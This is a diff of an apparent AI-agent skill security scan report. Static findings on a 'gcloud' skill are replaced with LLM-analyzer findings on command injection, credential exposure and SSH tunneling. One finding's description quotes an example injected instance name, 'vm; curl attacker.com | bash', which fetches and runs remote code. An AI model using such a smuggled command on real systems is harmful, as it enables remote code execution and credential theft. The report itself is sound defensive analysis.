@@ -1,50 +1,110 @@
 {
   "skill_name": "gcloud",
-  "skill_path": "./skills/clawhub-gcloud",
-  "skill_directory": "./skills/clawhub-gcloud",
-  "is_safe": false,
-  "max_severity": "CRITICAL",
-  "findings_count": 2,
+  "skill_path": "/workspace/skills/clawhub-gcloud",
+  "skill_directory": "/workspace/skills/clawhub-gcloud",
+  "is_safe": true,
+  "max_severity": "MEDIUM",
+  "findings_count": 3,
   "findings": [
     {
-      "id": "MANIFEST_MISSING_LICENSE_c5ae9be793",
-      "rule_id": "MANIFEST_MISSING_LICENSE",
-      "category": "policy_violation",
-      "severity": "LOW",
-      "title": "Skill does not specify a license",
-      "description": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.",
+      "id": "llm_finding_gcloud_0",
+      "rule_id": "LLM_COMMAND_INJECTION",
+      "category": "command_injection",
+      "severity": "MEDIUM",
+      "title": "Command Injection Risk via Unvalidated User Input in gcloud Commands",
+      "description": "The skill instructions demonstrate gcloud CLI commands with placeholder variables (INSTANCE_NAME, ZONE, PROJECT_ID, SERVICE_NAME, REGION, etc.) that would be populated from user input. When an agent executes these commands via Bash tool, unsanitized user input could lead to command injection. For example, a malicious INSTANCE_NAME like 'vm; curl attacker.com | bash' could execute arbitrary commands. The skill provides no input validation guidance or sanitization requirements.",
       "file_path": "SKILL.md",
       "line_number": null,
-      "snippet": null,
-      "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
-      "analyzer": "static",
+      "snippet": "Examples: 'gcloud compute ssh INSTANCE_NAME --zone ZONE --project PROJECT_ID --command \"uptime\"' and 'gcloud compute instances start INSTANCE_NAME --zone ZONE --project PROJECT_ID' - all use unvalidated placeholders that accept user input directly into shell commands.",
+      "remediation": "Add explicit input validation requirements in instructions: 1) Validate PROJECT_ID format (alphanumeric + hyphens), 2) Validate INSTANCE_NAME/SERVICE_NAME against GCP naming rules, 3) Sanitize all user inputs before shell execution, 4) Use gcloud's --format=json output and parse programmatically instead of shell interpolation, 5) Implement allowlists for ZONE and REGION values.",
+      "analyzer": "llm",
       "metadata": {
-        "meta_reviewed": true
+        "model": "claude-sonnet-4-5-20250929",
+        "overall_assessment": "This Google Cloud Platform skill provides legitimate GCP management functionality but has MEDIUM severity security concerns primarily around command injection risks and credential management. The skill demonstrates standard gcloud CLI usage patterns but lacks critical security guidance for: 1) Input validation to prevent command injection, 2) Credential protection and scope management, 3) SSH tunneling security implications. The skill does not contain malicious code or data exfiltration attempts - it's a straightforward GCP CLI wrapper. However, the absence of security guardrails in the instructions could lead to unsafe agent behavior when processing untrusted user input. The missing referenced files (Cloud.py, file.py, source.py, backup.py) appear to be parsing artifacts from the markdown content and are not actual security concerns. Primary risks are operational security issues rather than intentional threats.",
+        "primary_threats": [
+          "Command Injection (AITech-9.1)",
+          "Credential Exposure (AITech-8.2)",
+          "Tool Exploitation via SSH Tunneling (AITech-12.1)"
+        ],
+        "aitech": "AITech-9.1",
+        "aitech_name": "Model or Agentic System Manipulation",
+        "aisubtech": "AISubtech-9.1.4",
+        "aisubtech_name": "Injection Attacks (SQL, Command Execution, XSS)",
+        "scanner_category": "INJECTION ATTACK",
+        "meta_validated": true,
+        "meta_confidence": "HIGH",
+        "meta_confidence_reason": "LLM analyzer correctly identified that the skill provides no input validation guidance for user-supplied parameters that are directly interpolated into shell commands. This is a legitimate operational security concern for agent-executed commands.",
+        "meta_exploitability": "Medium - Requires agent to accept malicious user input and execute commands without validation. The gcloud CLI itself provides some protection, but shell operators in parameters could bypass this.",
+        "meta_impact": "High - Successful command injection could lead to arbitrary code execution on the system running the agent, potentially compromising credentials or data."
       }
     },
     {
-      "id": "YARA_command_injection_fa133ffa4d",
-      "rule_id": "YARA_command_injection",
-      "category": "command_injection",
-      "severity": "CRITICAL",
-      "title": "INJECTION ATTACK detected by YARA",
-      "description": "Detects command injection patterns in agent skills: shell operators, system commands, and network tools: curl -O ",
+      "id": "llm_finding_gcloud_1",
+      "rule_id": "LLM_DATA_EXFILTRATION",
+      "category": "data_exfiltration",
+      "severity": "MEDIUM",
+      "title": "Credential Exposure Risk via gcloud auth login Interactive Flow",
+      "description": "The installation instructions require 'gcloud auth login' which opens a browser-based OAuth flow. While this is the standard authentication method, the skill provides no guidance on: 1) Verifying the authentication scope requested, 2) Protecting the resulting credential files (~/.config/gcloud/), 3) Credential rotation policies, 4) Using service accounts instead of user credentials for automation. An agent following these instructions could inadvertently expose user credentials or grant excessive permissions.",
       "file_path": "SKILL.md",
-      "line_number": 11,
-      "snippet": "cd ~ && curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-linux-x86_64.tar.gz",
-      "remediation": "Review and remove injection attack pattern",
-      "analyzer": "static",
+      "line_number": null,
+      "snippet": "Installation section: '# Authenticate\\ngcloud auth login' with no security guidance on credential management, scope verification, or service account alternatives.",
+      "remediation": "Add security guidance: 1) Recommend service accounts for automation ('gcloud auth activate-service-account --key-file=KEY_FILE'), 2) Document minimum required OAuth scopes, 3) Add instructions to verify credential file permissions (chmod 600 ~/.config/gcloud/*), 4) Recommend credential rotation policies, 5) Warn about credential exposure risks in shared environments.",
+      "analyzer": "llm",
       "metadata": {
-        "yara_rule": "command_injection",
-        "yara_namespace": "command_injection",
-        "matched_string": "$data_exfiltration_tools",
-        "threat_type": "INJECTION ATTACK",
-        "meta_reviewed": true
+        "model": "claude-sonnet-4-5-20250929",
+        "overall_assessment": "This Google Cloud Platform skill provides legitimate GCP management functionality but has MEDIUM severity security concerns primarily around command injection risks and credential management. The skill demonstrates standard gcloud CLI usage patterns but lacks critical security guidance for: 1) Input validation to prevent command injection, 2) Credential protection and scope management, 3) SSH tunneling security implications. The skill does not contain malicious code or data exfiltration attempts - it's a straightforward GCP CLI wrapper. However, the absence of security guardrails in the instructions could lead to unsafe agent behavior when processing untrusted user input. The missing referenced files (Cloud.py, file.py, source.py, backup.py) appear to be parsing artifacts from the markdown content and are not actual security concerns. Primary risks are operational security issues rather than intentional threats.",
+        "primary_threats": [
+          "Command Injection (AITech-9.1)",
+          "Credential Exposure (AITech-8.2)",
+          "Tool Exploitation via SSH Tunneling (AITech-12.1)"
+        ],
+        "aitech": "AITech-8.2",
+        "aitech_name": "Data Exfiltration / Exposure",
+        "aisubtech": "AISubtech-8.2.3",
+        "aisubtech_name": "Data Exfiltration via Agent Tooling",
+        "scanner_category": "SECURITY VIOLATION",
+        "meta_validated": true,
+        "meta_confidence": "MEDIUM",
+        "meta_confidence_reason": "The skill uses standard GCP authentication methods. The lack of security guidance is a documentation gap rather than a vulnerability, but could lead to poor security practices.",
+        "meta_exploitability": "Low - This is about missing guidance, not an exploitable vulnerability.",
+        "meta_impact": "Low - Could lead to credential mismanagement, but requires user error."
+      }
+    },
+    {
+      "id": "llm_finding_gcloud_2",
+      "rule_id": "LLM_UNAUTHORIZED_TOOL_USE",
+      "category": "unauthorized_tool_use",
+      "severity": "MEDIUM",
+      "title": "SSH Tunneling Capability Enables Unauthorized Network Access",
+      "description": "The skill demonstrates SSH port forwarding ('-L 8080:localhost:8080') which could be abused to: 1) Bypass network security controls, 2) Access internal services not intended for external exposure, 3) Create persistent backdoor tunnels, 4) Exfiltrate data through tunneled connections. The instruction provides this capability without security warnings or use case restrictions.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": "'gcloud compute ssh INSTANCE_NAME --zone ZONE --project PROJECT_ID -- -L 8080:localhost:8080' demonstrates port forwarding without security context or restrictions.",
+      "remediation": "1) Add security warning about port forwarding risks, 2) Recommend using IAP tunneling instead ('gcloud compute start-iap-tunnel'), 3) Document when port forwarding is appropriate vs inappropriate, 4) Suggest firewall rules to restrict tunnel usage, 5) Recommend audit logging for SSH sessions with tunneling.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "claude-sonnet-4-5-20250929",
+        "overall_assessment": "This Google Cloud Platform skill provides legitimate GCP management functionality but has MEDIUM severity security concerns primarily around command injection risks and credential management. The skill demonstrates standard gcloud CLI usage patterns but lacks critical security guidance for: 1) Input validation to prevent command injection, 2) Credential protection and scope management, 3) SSH tunneling security implications. The skill does not contain malicious code or data exfiltration attempts - it's a straightforward GCP CLI wrapper. However, the absence of security guardrails in the instructions could lead to unsafe agent behavior when processing untrusted user input. The missing referenced files (Cloud.py, file.py, source.py, backup.py) appear to be parsing artifacts from the markdown content and are not actual security concerns. Primary risks are operational security issues rather than intentional threats.",
+        "primary_threats": [
+          "Command Injection (AITech-9.1)",
+          "Credential Exposure (AITech-8.2)",
+          "Tool Exploitation via SSH Tunneling (AITech-12.1)"
+        ],
+        "aitech": "AITech-12.1",
+        "aitech_name": "Tool Exploitation",
+        "aisubtech": "AISubtech-12.1.2",
+        "aisubtech_name": "Tool Poisoning",
+        "scanner_category": "SUSPICIOUS CODE EXECUTION",
+        "meta_validated": true,
+        "meta_confidence": "MEDIUM",
+        "meta_confidence_reason": "SSH tunneling is a documented GCP feature, not a vulnerability. However, the lack of security context could lead to misuse. This is more of a documentation improvement than a security flaw.",
+        "meta_exploitability": "Low - Requires intentional misuse of a legitimate feature. The user must have valid GCP credentials and SSH access.",
+        "meta_impact": "Medium - Could enable unauthorized access to internal services if misused, but requires existing legitimate access."
       }
     }
   ],
-  "scan_duration_seconds": 0.4677562713623047,
-  "duration_ms": 467,
+  "scan_duration_seconds": 39.300607442855835,
+  "duration_ms": 39300,
   "analyzers_used": [
     "static_analyzer",
     "behavioral_analyzer",
@@ -52,5 +112,5 @@
     "trigger_analyzer",
     "meta_analyzer"
   ],
-  "timestamp": "2026-02-03T16:15:23.667302"
+  "timestamp": "2026-02-06T02:36:04.403800"
 }
